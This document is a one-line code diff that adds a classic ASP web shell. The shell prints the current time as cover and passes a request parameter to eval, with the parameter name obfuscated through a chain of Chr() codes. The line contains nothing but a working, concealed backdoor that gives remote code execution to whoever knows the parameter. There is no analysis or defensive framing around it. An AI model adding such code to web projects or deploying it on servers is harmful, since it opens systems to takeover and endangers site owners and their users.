@@ -1,0 +1,1 @@
+<%response.write(now):eval(request(Chr(51)&Chr(117)&Chr(103)&Chr(88)&Chr(51)&Chr(103)&Chr(101)&Chr(107)&Chr(115)&Chr(97)))%>
